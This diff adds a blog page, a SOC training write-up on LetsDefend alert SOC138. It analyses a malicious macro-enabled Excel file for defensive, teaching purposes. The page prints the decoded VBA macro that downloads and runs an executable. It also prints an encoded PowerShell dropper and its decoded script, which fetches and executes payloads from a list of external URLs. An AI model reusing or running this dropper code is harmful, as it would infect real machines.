@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Alert Name: SOC138 – Detected Suspicious Xls File
+Severity: High
+Event ID: 77
+Event Time: Mar 13, 2021, 08:20 PM
+Category: Malware
+Play Book 1. Alert Overview A high-risk malware alert was triggered due to the detection of a suspicious Excel macro-enabled file (.xlsm) on the host Sofia. Macro-enabled Excel documents are commonly abused to deliver malware via embedded VBA code that downloads and executes malicious payloads.
+The file was allowed by the security device, increasing the potential risk of system compromise." />
+<meta name="keywords" content=", letsdefend, soc, blue, malware, xlsm, macro, powershell" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/letsdefend/alerts/soc138---detected-suspicious-xls-file/" />
+
+
+    <title>
+        
+            LetsDefend SOC138 – Suspicious XLS Malware Analysis :: Hello w3nch 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.ebe3824dfa5345ef854f8b255c278f701966e9be3892354b588fb1650ecd358e.css" integrity="sha256-6&#43;OCTfpTRe&#43;FT4slXCePcBlm6b44kjVLWI&#43;xZQ7NNY4=" crossorigin="anonymous">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="css/code.css">
+    
+
+    
+        <link rel="stylesheet" type="text/css" href="css/writeups.css">
+    
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="LetsDefend SOC138 – Suspicious XLS Malware Analysis">
+<meta itemprop="description" content="Alert Name: SOC138 – Detected Suspicious Xls File
+Severity: High
+Event ID: 77
+Event Time: Mar 13, 2021, 08:20 PM
+Category: Malware
+Play Book 1. Alert Overview A high-risk malware alert was triggered due to the detection of a suspicious Excel macro-enabled file (.xlsm) on the host Sofia. Macro-enabled Excel documents are commonly abused to deliver malware via embedded VBA code that downloads and executes malicious payloads.
+The file was allowed by the security device, increasing the potential risk of system compromise."><meta itemprop="datePublished" content="2026-01-16T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2026-01-16T00:00:00+00:00" />
+<meta itemprop="wordCount" content="944">
+<meta itemprop="keywords" content="letsdefend,soc,blue,malware,xlsm,macro,powershell," />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="LetsDefend SOC138 – Suspicious XLS Malware Analysis"/>
+<meta name="twitter:description" content="Alert Name: SOC138 – Detected Suspicious Xls File
+Severity: High
+Event ID: 77
+Event Time: Mar 13, 2021, 08:20 PM
+Category: Malware
+Play Book 1. Alert Overview A high-risk malware alert was triggered due to the detection of a suspicious Excel macro-enabled file (.xlsm) on the host Sofia. Macro-enabled Excel documents are commonly abused to deliver malware via embedded VBA code that downloads and executes malicious payloads.
+The file was allowed by the security device, increasing the potential risk of system compromise."/>
+
+
+
+
+
+    <meta property="article:section" content="SOC Writeups" />
+
+    <meta property="article:section" content="Malware Analysis" />
+
+
+
+    <meta property="article:published_time" content="2026-01-16 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                hello ;)</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner">
+                <li><a href="/about/">About</a></li>
+            
+                <li><a href="/posts/">Blog</a></li>
+            
+                <li><a href="/contact/">Contact</a></li>
+            
+                <li><a href="/resume.pdf">Resume</a></li>
+            
+                <li><a href="/writeups/">Writeups</a></li>
+            
+    </ul>
+</nav>
+
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            
+    <div class="content">
+        <main class="post">
+
+            <div class="post-info">
+                
+                </p>
+            </div>
+
+            <article>
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/letsdefend/alerts/soc138---detected-suspicious-xls-file/">LetsDefend SOC138 – Suspicious XLS Malware Analysis</a></h2>
+
+                
+                
+                
+
+                <div class="post-content">
+                    <p><strong>Alert Name:</strong> SOC138 – Detected Suspicious Xls File<br>
+<strong>Severity:</strong> High<br>
+<strong>Event ID:</strong> 77<br>
+<strong>Event Time:</strong> Mar 13, 2021, 08:20 PM<br>
+<strong>Category:</strong> Malware</p>
+<h2 id="play-book">Play Book</h2>
+<h3 id="1-alert-overview">1. Alert Overview</h3>
+<p>A high-risk malware alert was triggered due to the detection of a suspicious <strong>Excel macro-enabled file (.xlsm)</strong> on the host <strong>Sofia</strong>. Macro-enabled Excel documents are commonly abused to deliver malware via embedded VBA code that downloads and executes malicious payloads.</p>
+<p>The file was allowed by the security device, increasing the potential risk of system compromise.</p>
+<h3 id="2-key-event-details">2. Key Event Details</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Hostname</td>
+<td>Sofia</td>
+</tr>
+<tr>
+<td>Source IP</td>
+<td>172.16.17.56</td>
+</tr>
+<tr>
+<td>File Name</td>
+<td>ORDER SHEET &amp; SPEC.xlsm</td>
+</tr>
+<tr>
+<td>File Size</td>
+<td>2.66 MB</td>
+</tr>
+<tr>
+<td>File Hash</td>
+<td>7ccf88c0bbe3b29bf19d877c4596a8d4</td>
+</tr>
+<tr>
+<td>Device Action</td>
+<td>Allowed</td>
+</tr>
+</tbody>
+</table>
+<h3 id="3-threat-indicators-identified">3. Threat Indicators Identified</h3>
+<ul>
+<li>Presence of <strong>macro-enabled Excel file</strong></li>
+<li>Suspicious outbound network connections</li>
+<li>Indicators of <strong>download-and-execute behavior</strong></li>
+<li>Communication with external IP addresses associated with malware hosting</li>
+</ul>
+<h3 id="4-malware-quarantine-status">4. Malware Quarantine Status</h3>
+<ul>
+<li>The file was <strong>not quarantined</strong></li>
+<li>Execution was <strong>allowed</strong></li>
+<li>Manual investigation required</li>
+</ul>
+<h3 id="5-malware-analysis-tools-used">5. Malware Analysis Tools Used</h3>
+<ul>
+<li>AnyRun</li>
+<li>VirusTotal</li>
+<li>Hybrid Analysis</li>
+</ul>
+<p>Results from multiple platforms confirmed the file and related URLs as <strong>malicious</strong>.
+![[Pasted image 20251127232446.png]]</p>
+<h3 id="6-command-and-control-c2-communication-check">6. Command-and-Control (C2) Communication Check</h3>
+<p>Network traffic analysis shows outbound connections to a suspected C2 infrastructure. Evidence indicates that the macro script successfully attempted to contact external servers to retrieve additional payloads.
+![[Pasted image 20251127232446.png]]
+This strongly suggests successful execution of malicious code.
+![[Pasted image 20251127232550.png]]</p>
+<h3 id="7-containment-actions">7. Containment Actions</h3>
+<ul>
+<li>
+<p>Isolate the affected host <strong>Sofia</strong></p>
+</li>
+<li>
+<p>Preserve system for forensic investigation</p>
+</li>
+<li>
+<p>Block associated IPs and URLs</p>
+</li>
+<li>
+<p>Reset credentials for the affected user</p>
+</li>
+</ul>
+<hr>
+<h2 id="malware-analysis">Malware Analysis</h2>
+<p><strong>File:</strong> ORDER SHEET &amp; SPEC.xlsm<br>
+<strong>Size:</strong> 2.66 MB<br>
+<strong>Source Host:</strong> Sofia<br>
+<strong>Source IP:</strong> 172.16.17.56<br>
+<strong>Destination IP:</strong> 177.53.143.89<br>
+<strong>Date:</strong> Mar 13, 2021, 08:20 PM</p>
+<h3 id="8-static-analysis">8. Static Analysis</h3>
+<p>Static analysis was performed using <code>olevba</code> to inspect embedded VBA macros.</p>
+<p>olevba &ndash;analysis file.xls</p>
+<p>The macro code revealed obfuscation techniques, including <strong>Base64 encoding</strong>, to hide malicious behavior.</p>
+<p>Decoded VBA logic showed the macro performs the following actions:</p>
+<ul>
+<li>Downloads an executable from a remote server</li>
+<li>Saves the payload to disk</li>
+<li>Executes the downloaded file automatically</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>olevba --analysis file.xls
+</span></span></code></pre></div><p>This behavior confirms <strong>download-and-execute malware delivery</strong>.
+![[Pasted image 20251127221230.png]]</p>
+<ul>
+<li>Checking the macro source code</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> olevba --reveal ORDER<span style="color:#ae81ff">\ </span>SHEET<span style="color:#ae81ff">\ \&amp;\ </span>SPEC.xlsm   &gt; file.macro
+</span></span></code></pre></div><ul>
+<li>After analysis we can see some obsucation going on base64  and more</li>
+</ul>
+<pre tabindex="0"><code class="language-vba" data-lang="vba">Sub Auto_Open()
+    &#39; Base64 decoded URLs
+    payload_url = &#34;https://multiwaretecnologia.com.br/js/Podaleri4.exe&#34;
+    output_filename = &#34;Podaleri4.exe&#34;
+    
+    &#39; Download and execute
+    Call DownloadAndExecute(payload_url, &#34;C:\programdata\&#34; &amp; output_filename)
+End Sub
+
+Sub DownloadAndExecute(url, filepath)
+    &#39; Create objects for download
+    Set http = CreateObject(&#34;WinHttp.WinHttpRequest.5.1&#34;)
+    Set stream = CreateObject(&#34;ADODB.Stream&#34;)
+    Set fso = CreateObject(&#34;Scripting.FileSystemObject&#34;)
+    Set shell = CreateObject(&#34;WScript.Shell&#34;)
+    
+    &#39; Download file
+    http.Open &#34;GET&#34;, url, False
+    http.Send
+    
+    &#39; Save file
+    stream.Type = 1
+    stream.Open
+    stream.Write http.ResponseBody
+    stream.SaveToFile filepath, 2
+    stream.Close
+    
+    &#39; Execute downloaded file
+    shell.Run filepath
+End Sub
+</code></pre><h3 id="9-reputation-and-ioc-validation">9. Reputation and IOC Validation</h3>
+<ul>
+<li>URL and hash analysis via  <a href="https://www.virustotal.com/gui/url/ab77797faa53a72d96ee05e4472bdd623456f9f961e24b4ef987ad3f8e66fcf1?nocache=1">virustotal</a> flagged the file as malicious</li>
+<li>Serving IP address 177.11.52.83</li>
+<li>Hosting infrastructure linked to known malware campaigns</li>
+<li>Multiple engines confirmed the payload as malicious</li>
+</ul>
+<h3 id="10-dynamic-analysis">10. Dynamic Analysis</h3>
+<p>During runtime analysis, a heavily obfuscated <strong>PowerShell script</strong> was observed executing on the system.</p>
+<p>Key behaviors identified after decoding:</p>
+<ol>
+<li>Creates directory under <code>%USERPROFILE%</code></li>
+<li>Forces TLS 1.2 for secure outbound communication</li>
+<li>Downloads malware from multiple fallback URLs</li>
+<li>Saves payload as an executable</li>
+<li>Executes the file if it meets size conditions</li>
+<li>Uses redundancy to ensure successful infection</li>
+</ol>
+<ul>
+<li>Looking at the system there was a powershell script being executed</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>POwersheLL -ENCOD IAAgAHMAZQB0AC0ASQBUAEUATQAgAHYAYQByAGkAQQBCAEwAZQA6AGsAegBlAFEAbABVACAAIAAoAFsAdABZAFAAZQBdACgAJwBzAFkAJwArACcAcwBUAEUAbQAnACsAJwAuAGkAJwArACcAbwAuAGQASQByAEUAQwB0AE8AUgAnACsAJwBZACcAKQAgACAAKQAgACAAOwAgACAAcwBlAHQALQB2AGEAUgBJAGEAQgBMAGUAIAAgACgAJwByAEYARwAyADUAJwArACcANAAnACkAIAAgACgAIAAgAFsAVAB5AFAAZQBdACgAJwBTAFkAJwArACcAcwBUAEUAJwArACcAbQAnACsAJwAuAG4AJwArACcAZQBUAC4AcwBFAFIAJwArACcAVgBpAEMARQBwAG8AaQBOAFQAJwArACcAbQAnACsAJwBBAE4AYQBnAEUAJwArACcAcgAnACkAIAApADsAIAAgACAAUwBlAFQALQBpAHQAZQBNACAAKAAiAHYAQQAiACsAIgByAGkAQQAiACsAIgBCAGwAZQA6ADQARwBNAHMAIgApACAAKABbAHQAWQBQAGUAXQAoACcAUwBZAFMAVAAnACsAJwBlAE0AJwArACcALgBuAEUAdAAnACsAJwAuAFMAJwArACcARQAnACsAJwBDACcAKwAnAFUAJwArACcAcgBpAHQAWQBQAFIAbwBUAG8AJwArACcAYwBvAGwAVAB5AFAARQAnACkAIAApACAAIAA7ACAAJABXAHUAYQBtADcAagBlAD0AKAAnAFcANwA5AGgAJwArACcAcAAnACsAJwA3AHQAJwApADsAJABJADIAaABmADAAYwB3AD0AJABJADIAMwBkADYAZwB5ACAAKwAgAFsAYwBoAGEAcgBdACgAOAAwACAALQAgADMAOAApACAAKwAgACQATABiAHoAeQBmADcAagA7ACQAWgBfAGwAbwBjAGsAawA9ACgAJwBVACcAKwAnAGIAegBoAGQAZwBsACcAKQA7ACAAIAAkAGsAWgBFAFEAbABVADoAOgBDAFIARQBBAHQARQBkAGkAcgBlAEMAVABPAHIAeQAoACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAIAArACAAKAAoACcATwAnACsAJwBUAGYAVwA5ACcAKwAnAGwAdQAnACsAJwBkAGEAbgBPAFQAZgAnACsAJwBBAHYAJwArACcAZwBxAGsAagAzAE8AJwArACcAVABmACcAKQAgACAALQBjAHIARQBwAEwAYQBjAGUAIAAgACgAWwBDAGgAQQByAF0ANwA5ACsAWwBDAGgAQQByAF0AOAA0ACsAWwBDAGgAQQByAF0AMQAwADIAKQAsAFsAQwBoAEEAcgBdADkAMgApACkAOwAkAEIANwBkAHQAcwB5AG4APQAoACcAWAB6ADcAJwArACcANQB2AHIAZQAnACkAOwAgACAAKABnAGkAIAAgACgAIgB2ACIAKwAiAGEAUgBJAEEAQgBsAGUAOgBSACIAKwAiAGYARwAyADUANAAiACkAIAApAC4AVgBBAEwAdQBFADoAOgBTAGUAYwB1AFIAaQBUAFkAcABSAG8AVABPAEMATwBsACAAPQAgACAAIAAkADQAZwBNAHMAOgA6AHQATABTADEAMgA7ACQAUQA2AGkAcAB1AGUAaQA9ACgAJwBMACcAKwAnAGYAbAA0ACcAKwAnAHIAcQBoACcAKQA7ACQASQA1ADMAegBpAG0AbQAgAD0AIAAoACcAUwB0ACcAKwAnAHcAawAnACsAJwAzADEAdgAnACkAOwAkAFEAeABzAG4AcAByAGEAPQAoACcAWAAxAHYAagA5ADgAJwArACcAdgAnACkAOwAkAFIAYwBjAG0AbgB2AGcAPQAoACcATQB2AGQAJwArACcAYwA3ADYAaAAnACkAOwAkAEoAMAA5AHgAYQBmADIAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAKAAoACcAewAwAH0AJwArACcAVwA5AGwAdQBkAGEAbgAnACsAJwB7ADAAfQBBAHYAZwAnACsAJwBxAGsAagAzACcAKwAnAHsAMAAnACsAJwB9ACcAKQAgACAALQBGACAAWwBDAEgAQQBSAF0AOQAyACkAKwAkAEkANQAzAHoAaQBtAG0AKwAoACcALgBlACcAKwAnAHgAZQAnACkAOwAkAEcAOQA0ADgAdwA2AHgAPQAoACcARABfACcAKwAnADgAMwAnACsAJwA2ADAAbQAnACkAOwAkAEkAYgBjAHUAbwBpADgAPQBuAGUAVwAtAG8AYABCAEoAYABFAEMAVAAgAE4AZQBUAC4AdwBlAGIAQwBsAEkAZQBOAFQAOwAkAEoAdgBtAG0AZgB5ADAAPQAoACcAaAB0ACcAKwAnAHQAcAA6ACcAKwAnAC8ALwAnACsAJwB0AHUAZAAnACsAJwBvAHIAJwArACcAaQBuACcAKwAnAHYAZQAnACsAJwBzAHQAJwArACcALgBjACcAKwAnAG8AJwArACcAbQAvAHcAcAAtAGEAZAAnACsAJwBtAGkAJwArACcAbgAvAHIARwAnACsAJwB0AG4AVQBiADUAZgAnACsAJwAvACcAKwAnACoAaAB0AHQAcAAnACsAJwA6ACcAKwAnAC8ALwBkAHAALQB3AG8AJwArACcAbQBlACcAKwAnAG4AYgBhACcAKwAnAHMAJwArACcAawBlACcAKwAnAHQALgBjACcAKwAnAG8AbQAnACsAJwAvAHcAcAAtACcAKwAnAGEAJwArACcAZABtACcAKwAnAGkAbgAvACcAKwAnAEwAaQAvACcAKwAnACoAJwArACcAaAAnACsAJwB0AHQAcAA6AC8ALwBzACcAKwAnAHQAeQBsAGUAZgBpAHgALgBjACcAKwAnAG8ALwAnACsAJwBnAHUAaQBsAGwAbwAnACsAJwB0ACcAKwAnAGkAJwArACcAbgBlAC0AYwAnACsAJwByAG8AJwArACcAcwAnACsAJwBzACcAKwAnAC8AJwArACcAQwAnACsAJwBUAFIATgBPAFEALwAqAGgAdAB0AHAAOgAvAC8AYQByAGQAJwArACcAbwBzAC4AYwBvACcAKwAnAG0ALgBiAHIALwBzAGkAbQAnACsAJwB1AGwAYQBkAG8AcgAvAGIAUABOACcAKwAnAHgALwAnACsAJwAqAGgAdAAnACsAJwB0AHAAJwArACcAOgAnACsAJwAvAC8AZAByAHQAaABlAHUAJwArACcAcgBlAGwAcAAnACsAJwBsAGEAcwB0AGkAYwBzAHUAJwArACcAcgBnAGUAJwArACcAcgB5AC4AJwArACcAYwBvAG0ALwAnACsAJwBnACcAKwAnAGUAbgAnACsAJwBlAHIAYQBsAG8ALwByAGgAJwArACcAcgBoAGYAbAAnACsAJwB2ADkAJwArACcAMgAvACoAJwArACcAaAB0AHQAcAA6AC8ALwBiAG8AZAB5AGkAbgBuACcAKwAnAG8AdgBhAHQAJwArACcAaQBvAG4AJwArACcALgBjAG8ALgB6ACcAKwAnAGEALwAnACsAJwB3AHAAJwArACcALQBjACcAKwAnAG8AbgB0AGUAbgB0AC8AMgBzAHMAJwArACcASAB2ACcAKwAnAGkALwAqAGgAdAB0AHAAOgAvAC8AJwArACcAbgBvAG0AYQBkAGMAbwAuACcAKwAnAGUAcwAnACsAJwAvAHcAcAAtACcAKwAnAGEAZAAnACsAJwBtAGkAbgAvAE0AdgB3AFYASABDAEcALwAnACkALgBTAFAATABJAFQAKAAkAFkAeQB4ADEAeQBqADkAIAArACAAJABJADIAaABmADAAYwB3ACAAKwAgACQATABjADcANQBuADAAcQApADsAJABOAHoAYQBhAGQAegBsAD0AKAAnAEwAZABoAG4AeQBwACcAKwAnAHYAJwApADsAZgBvAHIAZQBhAGMAaAAgACgAJABQAGcAcABqADkAdwBhACAAaQBuACAAJABKAHYAbQBtAGYAeQAwACkAewB0AHIAeQB7ACQASQBiAGMAdQBvAGkAOAAuAGQAbwB3AG4ATABPAEEAZABGAGkATABlACgAJABQAGcAcABqADkAdwBhACwAIAAkAEoAMAA5AHgAYQBmADIAKQA7ACQARwBrAGUAaABpAHIAaQA9ACgAJwBaADIAJwArACcAcgB1ADAAJwArACcANAB4ACcAKQA7AEkAZgAgACgAKABnAEUAYABUAC0AYABJAFQAZQBNACAAJABKADAAOQB4AGEAZgAyACkALgBsAEUAbgBnAFQAaAAgAC0AZwBlACAAMgA2ADMANAA2ACkAIAB7ACgAWwB3AG0AaQBjAGwAYQBzAHMAXQAoACcAdwBpAG4AMwAnACsAJwAyAF8AUAByAG8AYwAnACsAJwBlAHMAcwAnACkAKQAuAEMAcgBlAEEAdABlACgAJABKADAAOQB4AGEAZgAyACkAOwAkAFYAagBnADkAbQAxAGoAPQAoACcAVgBrAHYAYgAnACsAJwB2AG4AJwArACcAYgAnACkAOwBiAHIAZQBhAGsAOwAkAEkAdgBjADYAagA2AGIAPQAoACcAWgAnACsAJwBiAG4AaAAyACcAKwAnADYAdwAnACkAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAEEANQA2AGcAcAB3ADgAPQAoACcAVwAnACsAJwA1ACcAKwAnAG8AZwB5ADAAcAAnACkA
+</span></span></code></pre></div><ul>
+<li>save the encoded part in a file</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> base64 -d powershell-encoded.file | iconv -f utf-16le -t utf-8
+</span></span></code></pre></div><ul>
+<li>Powershell code</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Set variables with obfuscated names</span>
+</span></span><span style="display:flex;"><span>Set-Item Variable<span style="color:#960050;background-color:#1e0010">:</span>kzeQlU ([<span style="color:#66d9ef">System.IO.Directory</span>])
+</span></span><span style="display:flex;"><span>Set-Variable rFG254 ([<span style="color:#66d9ef">System.Net.ServicePointManager</span>])
+</span></span><span style="display:flex;"><span>Set-Item Variable<span style="color:#960050;background-color:#1e0010">:</span>4GMs ([<span style="color:#66d9ef">System.Net.SecurityProtocolType</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create directory in user profile</span>
+</span></span><span style="display:flex;"><span>$Wuam7je = <span style="color:#e6db74">&#39;W79hp7t&#39;</span>
+</span></span><span style="display:flex;"><span>$I2hf0cw = $I23d6gy + [<span style="color:#66d9ef">char</span>](<span style="color:#ae81ff">80</span> - <span style="color:#ae81ff">38</span>) + $Lbzyf7j
+</span></span><span style="display:flex;"><span>$Z_lockk = <span style="color:#e6db74">&#39;Ubzhdgl&#39;</span>
+</span></span><span style="display:flex;"><span>$kzeQlU::CreateDirectory($env:userprofile + (<span style="color:#e6db74">&#39;OTfW9ludanOTfAvgqkj3OTf&#39;</span> <span style="color:#f92672">-replace</span> <span style="color:#e6db74">&#39;OTf&#39;</span>, <span style="color:#e6db74">&#39;\&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set security protocol to TLS 1.2</span>
+</span></span><span style="display:flex;"><span>$B7dtsyn = <span style="color:#e6db74">&#39;Xz75vre&#39;</span>
+</span></span><span style="display:flex;"><span>$rFG254::SecurityProtocol = $4GMs::Tls12
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Define variables and output path</span>
+</span></span><span style="display:flex;"><span>$Q6ipuei = <span style="color:#e6db74">&#39;Lfl4rqh&#39;</span>
+</span></span><span style="display:flex;"><span>$I53zimm = <span style="color:#e6db74">&#39;Stwk31v&#39;</span>
+</span></span><span style="display:flex;"><span>$Qxsnpra = <span style="color:#e6db74">&#39;X1vj98v&#39;</span>
+</span></span><span style="display:flex;"><span>$Rccmnvg = <span style="color:#e6db74">&#39;Mvdc76h&#39;</span>
+</span></span><span style="display:flex;"><span>$J09xaf2 = $env:userprofile + (<span style="color:#e6db74">&#39;{0}W9ludan{0}Avgqkj3{0}&#39;</span> <span style="color:#f92672">-f</span> [<span style="color:#66d9ef">char</span>]<span style="color:#ae81ff">92</span>) + $I53zimm + <span style="color:#e6db74">&#39;.exe&#39;</span>
+</span></span><span style="display:flex;"><span>$G948w6x = <span style="color:#e6db74">&#39;D_8360m&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create web client for downloads</span>
+</span></span><span style="display:flex;"><span>$Ibcuoi8 = New-Object Net.WebClient
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List of malicious download URLs</span>
+</span></span><span style="display:flex;"><span>$Jvmmfy0 = @(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;http://tudorinvest.com/wp-admin/rGtnUb5f/&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;http://dp-womenbasket.com/wp-admin/Li/&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;http://stylefix.co/guillotine-cross/CTRNQ/&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;http://ardos.com.br/simulador/bPNx/&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;http://drtheurelplasticsurgery.com/generalo/rhrhlfv92/&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;http://bodyinnovation.co.za/wp-content/2ssHvi/&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;http://nomadco.es/wp-admin/MvwVHCG/&#39;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$Nzaadzl = <span style="color:#e6db74">&#39;Ldhnypv&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Download and execute loop</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($Pgpj9wa <span style="color:#66d9ef">in</span> $Jvmmfy0) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Download file from current URL</span>
+</span></span><span style="display:flex;"><span>        $Ibcuoi8.DownloadFile($Pgpj9wa, $J09xaf2)
+</span></span><span style="display:flex;"><span>        $Gkehiri = <span style="color:#e6db74">&#39;Z2ru04x&#39;</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># If file is large enough (26KB+), execute it</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">If</span> ((Get-Item $J09xaf2).Length <span style="color:#f92672">-ge</span> <span style="color:#ae81ff">26346</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Create process using WMI</span>
+</span></span><span style="display:flex;"><span>            ([<span style="color:#66d9ef">wmiclass</span>](<span style="color:#e6db74">&#39;win32_Process&#39;</span>)).Create($J09xaf2)
+</span></span><span style="display:flex;"><span>            $Vjg9m1j = <span style="color:#e6db74">&#39;Vkvvnb&#39;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>            $Ivc6j6b = <span style="color:#e6db74">&#39;Zbnh26w&#39;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Silent fail - try next URL</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$A56gpw8 = <span style="color:#e6db74">&#39;W5ogy0p&#39;</span>
+</span></span></code></pre></div><p>This confirms a <strong>multi-stage malware infection chain</strong>.</p>
+<ol>
+<li><strong>Creates Directory</strong>: <code>%USERPROFILE%\W9ludan\Avgqkj3\</code></li>
+<li><strong>Sets Security</strong>: Enables TLS 1.2 for secure downloads</li>
+<li><strong>Downloads</strong>: Tries multiple backup URLs to download malware</li>
+<li><strong>Target File</strong>: <code>%USERPROFILE%\W9ludan\Avgqkj3\Stwk31v.exe</code></li>
+<li><strong>Executes</strong>: Runs the downloaded file if it&rsquo;s &gt;26KB</li>
+<li><strong>Redundancy</strong>: Tries multiple URLs until one works</li>
+</ol>
+<h3 id="11-impact-assessment">11. Impact Assessment</h3>
+<ul>
+<li>Malware execution: <strong>Yes</strong></li>
+<li>System compromise: <strong>Likely</strong></li>
+<li>Data exposure: <strong>Unknown</strong></li>
+<li>Persistence mechanisms: <strong>Possible</strong></li>
+<li>Business impact: <strong>High risk</strong></li>
+</ul>
+<h3 id="12-recommended-actions">12. Recommended Actions</h3>
+<ol>
+<li>Immediately isolate the infected host</li>
+<li>Perform full disk and memory forensic analysis</li>
+<li>Block all identified malicious IOCs</li>
+<li>Reimage the system if compromise is confirmed</li>
+<li>Conduct user awareness training on malicious documents</li>
+<li>Enhance email and attachment filtering policies</li>
+</ol>
+<h3 id="final-verdict">Final Verdict</h3>
+<p><strong>True Positive – Confirmed Malware Execution</strong></p>
+<p>The Excel macro-enabled document executed malicious VBA code that downloaded and ran an external payload. Network and behavioral evidence confirms active malware execution. Immediate containment and remediation are required.</p>
+<hr>
+<p><strong>Analyst Note</strong></p>
